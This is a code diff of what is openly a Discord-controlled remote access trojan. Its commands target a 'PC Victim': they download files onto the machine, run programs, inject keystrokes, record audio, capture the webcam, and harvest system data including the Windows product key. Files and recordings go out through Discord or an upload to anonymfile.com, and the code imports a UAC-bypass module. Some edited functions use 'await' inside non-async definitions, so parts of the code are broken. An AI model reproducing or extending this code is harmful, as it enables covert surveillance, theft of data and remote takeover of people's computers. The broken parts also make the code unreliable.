@@ -17,6 +17,7 @@ from winpwnage.functions.uac.uacMethod1 import uacMethod1
 
 os.system('cls')
 pc = Info()
+ip = pc.IP()
 PREFIX = '>'
 devmode = False
 client = commands.Bot(command_prefix=commands.when_mentioned_or(PREFIX), intents = discord.Intents.all(), help_command=PrettyHelp())
@@ -124,21 +125,15 @@ class Control(commands.Cog, description='Control PC Victim'):
 	async def Upload(self, ctx, ID: str, url: str, path_file: str = '.',):
 		if not CheckID(ID):
 			return
-		async def upload():
-			await SendOutput(ctx, 'Starting Upload...}')
+		await SendOutput(ctx, 'Starting Upload...}')
+		def upload():
 			response = requests.get(url)
 			parse = urlparse(url)
 			filename = os.path.basename(parse.path)
 			open(f'{path_file}/{filename}', "wb").write(response.content)
 			await SendOutput(ctx, f"Uploaded File {path_file}/{filename}")
 
-		def between_upload():
-			loop = asyncio.new_event_loop()
-			asyncio.set_event_loop(loop)
-
-			loop.run_until_complete(typing())
-			loop.close()
-		threading.Thread(target = between_upload).start()
+		threading.Thread(target = upload).start()
 
 	@commands.command(aliases=["down", "d"], brief='Download File From PC Victim', description='Download File From PC Victim')
 	async def Download(self, ctx, ID: str, path_file: str = '.',):
@@ -147,7 +142,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 		if not os.path.exists(path_file):
 			await SendOutput(ctx, f"Not Found File {path_file}")
 			return
-		async def download():
+		def download():
 			if os.path.getsize(path_file) < 25000000:
 				filename = os.path.basename(path_file)
 				file = discord.File(path_file, filename=filename)
@@ -164,13 +159,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 				url_file = json_r['data']['file']['url']['full']
 				await SendOutput(ctx, f"Upload File {filename} To Anonymfile Success\nUrl File: {url_file}")
 
-		def between_download():
-			loop = asyncio.new_event_loop()
-			asyncio.set_event_loop(loop)
-
-			loop.run_until_complete(typing())
-			loop.close()
-		threading.Thread(target = between_download).start()
+		threading.Thread(target = download).start()
 
 	@commands.command(aliases=["run", "r"], brief='Run File From PC Victim', description='Run File From PC Victim')
 	async def Run(self, ctx, ID: str,  method = 'cmd', path_file: str = '.'):
@@ -262,15 +251,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 				keyboard_.press(char)
 				keyboard_.release(char)
 				time.sleep(delay)
-			await SendOutput(ctx, 'Done!')
 
-		def between_typing():
-			loop = asyncio.new_event_loop()
-			asyncio.set_event_loop(loop)
-
-			loop.run_until_complete(typing())
-			loop.close()
-		threading.Thread(target = between_typing).start()
+		threading.Thread(target = typing).start()
+		await SendOutput(ctx, 'Done!')
 
 	@commands.command(aliases=["mouse", "mse"], brief='Control Mouse PC Victim', description='Control Mouse PC Victim')
 	async def Mouse(self, ctx, ID: str, mode: str = 'set_postion',  x = 0, y = 0):
@@ -308,38 +291,29 @@ class Control(commands.Cog, description='Control PC Victim'):
 	async def RecordAudio(self, ctx, ID: str, duration: int = 5):
 		if not CheckID(ID):
 			return
-		async def recordaudio():
-			path_audio = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\rcad.wav"
-			freq = 44100
-			recording = sd.rec(int(duration * freq),
-					   samplerate=freq, channels=2)
-			await SendOutput(ctx, "Starting Recording")
-			sd.wait()
-			wv.write(path_audio, recording, freq, sampwidth=2)
-			await SendOutput(ctx, "Recording Success")
-			if os.path.getsize(path_audio) < 25000000:
-				filename = os.path.basename(path_audio)
-				file = discord.File(path_audio, filename=filename)
-				await SendOutput(ctx, f"Upload Audio {filename}")
-				await ctx.send(file=file)
-			else:
-				filename = os.path.basename(path_audio)
-				file = {"file": open(path_audio, 'rb')}
-				r = requests.post('https://anonymfile.com/api/v1/upload', files=file)
-				json_r = json.loads(r.text)
-				if not json_r['status']:
-					await SendOutput(ctx, f"Upload Audio {path_audio} To Anonymfile Failed")
-					return
-				url_file = json_r['data']['file']['url']['full']
-				await SendOutput(ctx, f"Upload Audio {filename} To Anonymfile Success\nUrl Audio: {url_file}")
-
-		def between_reacordaudio():
-			loop = asyncio.new_event_loop()
-			asyncio.set_event_loop(loop)
-
-			loop.run_until_complete(typing())
-			loop.close()
-		threading.Thread(target = between_reacordaudio).start()
+		path_audio = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\rcad.wav"
+		freq = 44100
+		recording = sd.rec(int(duration * freq),
+				   samplerate=freq, channels=2)
+		await SendOutput(ctx, "Starting Recording")
+		sd.wait()
+		wv.write(path_audio, recording, freq, sampwidth=2)
+		await SendOutput(ctx, "Recording Success")
+		if os.path.getsize(path_audio) < 25000000:
+			filename = os.path.basename(path_audio)
+			file = discord.File(path_audio, filename=filename)
+			await SendOutput(ctx, f"Upload Audio {filename}")
+			await ctx.send(file=file)
+		else:
+			filename = os.path.basename(path_audio)
+			file = {"file": open(path_audio, 'rb')}
+			r = requests.post('https://anonymfile.com/api/v1/upload', files=file)
+			json_r = json.loads(r.text)
+			if not json_r['status']:
+				await SendOutput(ctx, f"Upload Audio {path_audio} To Anonymfile Failed")
+				return
+			url_file = json_r['data']['file']['url']['full']
+			await SendOutput(ctx, f"Upload Audio {filename} To Anonymfile Success\nUrl Audio: {url_file}")
 
 	@commands.command(aliases=["webcamcapture", "wcap"], brief='Capture Webcam PC Victim', description='Capture Webcam PC Victim')
 	async def WebcamCapture(self, ctx, ID: str):
@@ -467,14 +441,14 @@ URL="""+ url +"""
 class OtherCommands(commands.Cog, description='Other Commands'):
 	@commands.command(aliases=['list'], brief='List All Victim', description='List All Victim')
 	async def List(self, ctx):
-		vic = discord.Embed(title = f'Victim {pc.HostName()}', description = f'**__INFORMATION__**\n```autohotkey\nIP: {pc.IP()}\nID: {create_uuid_from_string(pc.HWID())}\nHWID: {pc.HWID()}\n```')
+		vic = discord.Embed(title = f'Victim {pc.HostName()}', description = f'**__INFORMATION__**\n```autohotkey\nIP: {ip}\nID: {create_uuid_from_string(pc.HWID())}\nHWID: {pc.HWID()}\n```')
 		await ctx.send(embed = vic)
 
 	@commands.command(aliases=["getinfo"], brief='Get Information of PC Victim', description='Get Information of PC Victim')
 	async def GetInformation(self, ctx, ID: str, ):
 		if not CheckID(ID):
 			return
-		information_embed = discord.Embed(description=f"**__System Info__**\n```autohotkey\nComputer Name: {pc.HostName()}\nComputer OS: {pc.OSPlatform()} {pc.OSVersion()}\nCPU: {pc.Processor()}\nMac Address: {pc.MacAddress()}\nIP: {pc.IP()}\nTotal Cores: {pc.TotalCores()}\nTotal RAM: {pc.TotalRAM()}\nProduct Key: {pc.WindowProductKey()}\n```\n**__IP Info__**```prolog\nIP: {pc.IP()}\nRegion: {pc.IPData()['region']}\nCountry: {pc.IPData()['country']}\nCity: {pc.IPData()['city']}\nOrg: {pc.IPData()['org']}\n```")
+		information_embed = discord.Embed(description=f"**__System Info__**\n```autohotkey\nComputer Name: {pc.HostName()}\nComputer OS: {pc.OSPlatform()} {pc.OSVersion()}\nCPU: {pc.Processor()}\nMac Address: {pc.MacAddress()}\nIP: {ip}\nTotal Cores: {pc.TotalCores()}\nTotal RAM: {pc.TotalRAM()}\nProduct Key: {pc.WindowProductKey()}\n```\n**__IP Info__**```prolog\nIP: {pc.IP()}\nRegion: {pc.IPData()['region']}\nCountry: {pc.IPData()['country']}\nCity: {pc.IPData()['city']}\nOrg: {pc.IPData()['org']}\n```")
 		await ctx.send(embed = information_embed)
 
 @client.event
